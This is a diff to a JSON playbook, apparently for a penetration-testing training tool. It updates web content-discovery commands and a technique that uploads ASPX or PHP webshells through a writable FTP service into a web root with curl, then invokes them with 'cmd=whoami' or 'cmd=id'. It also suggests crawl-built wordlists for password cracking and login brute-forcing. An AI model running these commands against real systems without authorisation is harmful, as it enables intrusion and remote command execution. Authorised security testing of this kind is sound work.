@@ -88,27 +88,27 @@
       "commands": [
         {
           "tool": "feroxbuster",
-          "run": "feroxbuster -u http://{{target}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o scans/ferox.txt",
+          "run": "feroxbuster -u {{web_origin}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o scans/ferox.txt",
           "note": "Runs recursively with filtering. Keep an eye out for .git, backup file extensions, /admin, /api, /uploads."
         },
         {
           "tool": "ffuf",
-          "run": "ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403 -of json -o scans/ffuf.json",
+          "run": "ffuf -u {{web_origin}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403 -of json -o scans/ffuf.json",
           "note": "A lighter sweep; the JSON output imports neatly into the mentor drop folder."
         },
         {
           "tool": "gobuster",
-          "run": "gobuster dir -u http://{{target}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak -o scans/gobuster.txt",
+          "run": "gobuster dir -u {{web_origin}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak -o scans/gobuster.txt",
           "note": "The long-standing alternative (a classic recursive scanner alongside feroxbuster). -x tacks on extension fuzzing; use -k for invalid TLS certificates."
         },
         {
           "tool": "cewl",
-          "run": "cewl -d 2 -m 5 -w cewl.txt http://{{target}}",
+          "run": "cewl -d 2 -m 5 -w cewl.txt {{web_origin}}",
           "note": "OPTIONAL: crawl the site and build a wordlist from its own words. A target-specific list often cracks a password that rockyou never will; feed cewl.txt to the Crack Hashes station or a login brute."
         },
         {
           "tool": "eyewitness",
-          "run": "eyewitness --web --single http://{{target}} -d eyewitness_report",
+          "run": "eyewitness --web --single {{web_origin}} -d eyewitness_report",
           "note": "OPTIONAL: screenshot the web service so you can eyeball the stack and the login pages at a glance instead of curling each path. Most useful once content discovery has surfaced several endpoints or vhosts."
         }
       ]
@@ -2991,8 +2991,8 @@
     },
     {
       "id": "ftp-webroot-upload-webshell",
-      "title": "Anonymous FTP Webroot Write to Webshell Execution",
-      "hypothesis": "Anonymous or low-privilege FTP users with write access directly to the web server docroot (C:\\inetpub\\wwwroot or /var/www/html) can upload ASPX, ASP, or PHP webshells and trigger them over HTTP.",
+      "title": "Writable FTP Webroot Upload to Webshell Execution",
+      "hypothesis": "Anonymous or authenticated FTP users whose root or writable folder maps directly to the web server docroot (C:\\inetpub\\wwwroot or /var/www/html) can upload ASPX, ASP, or PHP webshells over FTP and trigger them over HTTP.",
       "tool": "curl",
       "tools": [
         "curl",
@@ -3003,13 +3003,11 @@
         "linux"
       ],
       "requires_all": [
-        "ftp.anon_write"
+        "http.reachable"
       ],
       "requires_any": [
-        "port:80",
-        "port:443",
-        "port:8080",
-        "http.reachable"
+        "ftp.anon_write",
+        "ftp.authenticated"
       ],
       "produces": [
         "foothold.webshell"
@@ -3019,7 +3017,7 @@
       "proves": "uploads and executes webshell payload via writable FTP directory mapped to web document root",
       "does_not_prove": "elevated administrative operating system access beyond webpool user",
       "report": {
-        "finding": "Arbitrary File Upload to Webroot via Anonymous FTP Service",
+        "finding": "Arbitrary File Upload to Webroot via Writable FTP Service",
         "severity": "critical"
       },
       "refs": [
@@ -3028,13 +3026,18 @@
       "commands": [
         {
           "tool": "curl",
-          "run": "curl -T shell.aspx 'ftp://anonymous:anonymous@{{target}}/'",
-          "note": "Upload ASPX or PHP webshell directly into webroot via writable anonymous FTP service."
+          "run": "curl -T shell.aspx 'ftp://{{target}}/shell.aspx' --user '{{user|anonymous}}:{{password|anonymous}}'",
+          "note": "Upload an ASPX webshell into an IIS webroot exposed over anonymous or authenticated FTP."
         },
         {
           "tool": "curl",
-          "run": "curl -s 'http://{{target}}/shell.aspx?cmd=whoami'",
-          "note": "Invoke uploaded webshell via HTTP GET request to verify command execution and establish foothold."
+          "run": "curl -T shell.php 'ftp://{{target}}/shell.php' --user '{{user|anonymous}}:{{password|anonymous}}'",
+          "note": "Upload a PHP webshell into an Apache/Nginx webroot exposed over anonymous or authenticated FTP."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -sk '{{web_origin}}/shell.aspx?cmd=whoami' || curl -sk '{{web_origin}}/shell.php?cmd=id'",
+          "note": "Invoke the uploaded webshell over the active HTTP/HTTPS origin to verify command execution and establish a foothold."
         }
       ],
       "deprioritize_when": [
